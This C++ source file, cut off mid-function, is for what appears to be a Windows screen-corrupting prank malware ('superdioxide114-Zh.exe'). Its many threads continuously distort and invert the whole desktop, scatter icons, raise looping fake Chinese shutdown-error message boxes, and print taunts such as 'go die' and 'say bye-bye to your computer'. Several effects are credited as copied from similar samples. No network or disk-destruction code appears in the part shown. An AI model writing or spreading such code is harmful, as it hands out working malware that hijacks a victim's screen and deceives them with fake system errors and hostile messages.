﻿#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include"resource.h"
#pragma optimize("", off)//I have no idea. :(
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
#define RGBBRUSH 0x1900ac010e
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    HBRUSH hBrush = CreateSolidBrush(RndRGB);
    SelectClipRgn(hdc, hrgn);
    SelectObject(hdc, hBrush);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    DeleteObject(hrgn);
    DeleteObject(hBrush);
    ReleaseDC(NULL, hdc);
}
VOID WINAPI MG(HWND hwnd) {
    RECT r; GetWindowRect(hwnd, &r);
    int time = GetTickCount();
    int w = r.right - r.left, h = r.bottom - r.top;
    while (true) {
        BitBlt(GetDC(hwnd), 0, 0, w, h, GetDC(hwnd), 0, 0, NOTSRCCOPY);
        Sleep(1000);
    }
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    HWND msgboxHWND;
    if (nCode == HCBT_ACTIVATE)
    {
        msgboxHWND = (HWND)wParam;
        Sleep(100);
        HANDLE mbm = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MG, msgboxHWND, 0, NULL);
        return 0;
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI Window1_Msgbox(LPVOID lpParam) {
    while (true) {
        int mes2 = IDYES;
        int mes = MessageBoxW(NULL, L"winint.exe发生了一些问提：\n错误0x1314在位于0x7891的地方，请尽快保存重要的文件，Windows将在0x54188时关机。\n\n按‘是’立即重启。\n按‘否’重启winint.exe。", L"shutdown.exe", MB_ICONWARNING | MB_YESNO);
        if (mes == IDYES) {
            while (mes2 == IDYES) {
                mes2 = MessageBoxW(NULL, L"无法关机。\nshutdown.exe出现错误0x114514位于0x1919810。\n\n按‘是’重试。\n按‘否’退出。", L"错误", MB_ICONERROR | MB_YESNO);
            }
        }
    }
}
DWORD WINAPI Shader1_NoName(LPVOID lpParam) {//from Neoarsphenamine.exe
    PRGBTRIPLE rgbtriple; int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, t = (x | y);
            rgbtriple[i].rgbtRed += t + x + xxx;
            rgbtriple[i].rgbtGreen += t + i + xxx;
            rgbtriple[i].rgbtBlue += t + y + xxx;
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -13 + rand() % 26, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); xxx += 2;
    }
}
DWORD WINAPI Shader2_NoName2(LPVOID lpParam) {//from Neoarsphenamine.exe
    float colorShift = 131.3;
    float colorIntensity = 0.13;
    while (1) {
        INT i = 0;
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int Xii = x * i & i;
                int Yii = i * y - i;
                int fx = (int)((i * 3) + (i * 6) * sin((Xii + i) * (Yii - i)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(h) * colorIntensity, 1.0f);
                hslcolor.s = fmod(hslcolor.s + (x % 5) / 10.0f, 2.0f);
                hslcolor.l = fmod(hslcolor.l + (y % 5) / 5.0f, 3.0f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload1a_Superdioxide114(LPVOID lpParam) {
    int signX = 10, signY = 10;
    int x = 0, y = 0;
    int width = 300;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        HFONT hFont = CreateFontA(width, 0, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Microsoft Yahei");
        HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 0));
        SetTextColor(hcdc, 0x00);
        SetBkMode(hcdc, 0);
        SelectObject(hcdc, hBitmap);
        SelectObject(hcdc, hFont);
        SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, w, h, PATCOPY);
        TextOutA(hcdc, x, y, "S", 1);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        if (x <= 0) { signX = 10; }
        if (x + width >= w) { signX = -10; }
        if (y <= 0) { signY = 10; }
        if (y + width >= h) { signY = -10; }
        x += signX;
        y += signY;
        ReleaseDC(NULL, hdc); DeleteDC(hcdc);
        DeleteObject(hBitmap); DeleteObject(hFont); DeleteObject(hBrush);
        Sleep(10);
    }
}
DWORD WINAPI Payload1b_114Icon(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HICON hIcon[] = { LoadIcon(GetModuleHandle(NULL),MAKEINTRESOURCE(IDI_ICON1)),LoadIcon(GetModuleHandle(NULL),MAKEINTRESOURCE(IDI_ICON2)) };
        DrawIcon(GetDC(0), rand() % w, rand() % h, hIcon[rand() % 2]);
        Sleep(10);
    }
}
DWORD WINAPI Shader3_NoName3_th4a(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -13 + rand() % 26, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        GetBitmapBits(hBitmap, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            data[i].r &= i;  data[i].g += i; data[i].b |= i;
            data[i].rgb += 1145 ^ (i + xxx + ((x + xxx) ^ (y)));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(10); xxx += 4;
    }
}
DWORD WINAPI Payload2_Ci_th4b(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int x = rand() % w, y = rand() % h;
        int width = 50;
        int widthtmp = 50;
        for (int i = 0; i <= rand() % 7 + 4; i++) {
            ci(x - (i * 50), y - (i * 50), widthtmp, widthtmp);
            widthtmp += 100;
            Sleep(10);
        }
        Sleep(100);
    }
}
DWORD WINAPI Shader4_NoName4_th5a(LPVOID lpParam) {//from XUGE.exe
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i + w, y = i - w;
            rgbScreen[i].rgb += x | y;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Payload3_114Icon2_th5b(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        for (int x = 0; x <= w; x += 32) {
            for (int y = 0; y <= h; y += 32) {
                DrawIcon(hdc, x, y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(rand() % 2 ? IDI_ICON1 : IDI_ICON2)));
            }
        }
        Sleep(1000);
    }
}
DWORD WINAPI Shader5_NoName5(LPVOID lpParam) {//from interknot.exe
    int i = 0;
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y ^ x * h;
                int fx = (int)((i ^ 4) + ((4 - i)) + (i * 9) + ((i * 3))) * pow(y, 1.0 / 3.0);
                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCERASE);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload4a_Rotate(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RotateDC(hdc, rand() % 360, {rand() % w,rand() % h});
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        Sleep(10);
    }
}
DWORD WINAPI Payload4b_Icon(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(LoadLibrary(L"C:\\Windows\\System32\\imageres.dll"), MAKEINTRESOURCE(rand() % 300)));
        Sleep(10);
        DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(LoadLibrary(L"C:\\Windows\\System32\\shell32.dll"), MAKEINTRESOURCE(rand() % 300)));
        Sleep(10);
        DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(LoadLibrary(L"C:\\Windows\\System32\\UserAccountControlSettings.dll"), MAKEINTRESOURCE(1)));
        Sleep(10);
    }
}
DWORD WINAPI Payload5_Wave(LPVOID lpParam) {//from Tatsuium.exe
    double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        for (int x = 0; x < w; x += 20) {
            StretchBlt(hcdc, x, -5 + rand() % 11, 20, h, hcdc, x, 0, 20, h, SRCAND);
        }
        for (float i = 0; i < w; i += 0.99f) {
            int a = sin(angle) * 20;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, SRCCOPY);
            angle += 3.1415926 / 40;
        }
        for (float i = 0; i < h; i += 0.99f) {
            int a = cos(angle) * 24;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, SRCCOPY);
            angle += 3.1415926 / 40;
        }
        for (int kun = 0; kun < 5; kun++) {
            int x = rand() % w, y = rand() % h; HRGN hrgn = CreateEllipticRgn(x, y, x + 120, y + 120);
            SelectClipRgn(hcdc, hrgn);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, x, y, w, h, hcdc, x, y, PATINVERT);
            DeleteObject(hrgn); DeleteObject(hBrush);
        }
        GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader6_Move(LPVOID lpParam) {//from radiance.exe
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int i = 0, r = 2, g = 1, b = 4, p = 36;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = 1 + rand() % 55;
        for (int i = 0; w * h > i; i++) {
            ((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v * p))[r] + 11;
            ((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v % p))[g] - 45;
            ((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v % p))[b] % 14;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i %= 3;
        Sleep(10);
    }
}
DWORD WINAPI Payload6a_Mix(LPVOID lpParam) {//from Alkyl octanitrogen.exe
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        SelectObject(desk, CreateHatchBrush(rand() % 7, RndRGB));
        Ellipse(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        Rectangle(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        BitBlt(desk, rand() % 10, rand() % 10, sw, sh, desk, rand() % 10, rand() % 10, 0x2837E28);
        Sleep(20);
        if (rand() % 35 == 5) InvalidateRect(0, 0, 0);
    }
}
DWORD WINAPI Payload6b_Str(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        SetStretchBltMode(hdc, HALFTONE);
        StretchBlt(hdc, 1, 1, sw + 2, sh + 2, hdc, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload6c_Text(LPVOID lpParam) {
    LPCSTR text[] = { "superdioxide114-Zh.exe","请输入文本","去死。","你就像个婴儿。","依旧依旧>:)","fitbie114514","我是你8","你喜不喜欢这种感觉？？","啥比n17","uiui","L0L","依旧用这台电脑吗？","你不想活。","向你的电脑说‘拜拜’。" };
    while (true) {
        int tmp = rand() % 14;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, RndRGB);
        HFONT font = CreateFontA(50, 0, 0, rand() % 100, FW_DONTCARE, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Microsoft Yahei");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(25);
    }
}
DWORD WINAPI Payload7_Wave2(LPVOID lpParam) {//from radiance.exe,but I modified it
    double angle = 0;
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (float i = 0; i < w + h; i += 0.99f) {
            int a = cos(angle) * 40;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, NOTSRCCOPY);
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, NOTSRCCOPY);
            angle += 3.1415926 / 600;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(500);
    }
}
DWORD WINAPI Shader7_Darker(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hsl;
    hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    float i = 0;
    while (true) {
        hdc = GetDC(NULL); int x1, y1, w1, h1;
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                hsl = Colors::rgb2hsl(rgbquad[index]);
                hsl.l -= 0.3f;
                rgbquad[index] = Colors::hsl2rgb(hsl);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader8_NoName6(LPVOID lpParam) {//from Alkyl octanitrogen.exe,but i modified it
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        hdc = GetDC(0); BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                rgbquad[index].rgbRed += (i & x) + i;
                rgbquad[index].rgbGreen += (i | y) + i;
                rgbquad[index].rgbBlue += (i ^ x + y) + i;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(10); i += 2;
    }
}
DWORD WINAPI Shader9_Line(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += x >> y << x * i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader10_Error(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(0), screenHigh = GetSystemMetrics(1);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHigh;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHigh, hdcScreen, 0, 0, SRCCOPY);
        for (int i = 0; i < screenWidth * screenHigh; i++) {
